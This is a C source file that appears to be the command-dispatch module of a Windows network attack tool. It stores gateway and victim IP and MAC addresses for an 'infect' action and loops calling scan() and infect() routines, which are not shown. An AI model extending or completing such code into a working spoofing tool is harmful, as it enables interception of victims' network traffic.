#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "infect.h"
#include "scan.h"
#include "commands.h"
#include "network_headers.h"

//globals
static HANDLE running_thread;
static BYTE acts[ACTS_NUM] = {0};
extern send_params infect_params;

/*
* @purpose: set active actions.
* @params: command (action)
* @return void.
*
*/
void add_command(pCommand command)
{	
	if (command->act == INFECT)
	{
		/* set global variables for infect thread */
		infect_params.gateway_ip = htonl(command->gateway_ip);
		infect_params.victim_ip = htonl(command->victim_ip);
		memcpy(infect_params.gateway_mac, command->gateway_mac, ETH_ALEN);
		memcpy(infect_params.victim_mac, command->victim_mac, ETH_ALEN);
	}
	/* set active */
	acts[command->act] = 1;
}

/*
* @purpose: execute command requests.
* @params: lparam pointer.
* @return 0.
*
*/
DWORD WINAPI execute_commands(LPVOID lparam)
{	
	while (1)
	{
		/* iterate over scan/infect actions */
		for (size_t act = 0; act < ACTS_NUM; act++)
		{
			if (acts[act])
			{
				/* action active request */
				switch (act)
				{
				case SCAN:
					scan();
					acts[SCAN] = 0; //action not active. 
					break;
				case INFECT:
					infect();
					acts[INFECT] = 0; //action not active. 
					break;
				}
			}
		}
		Sleep(1000);
	}
	return 0;
}
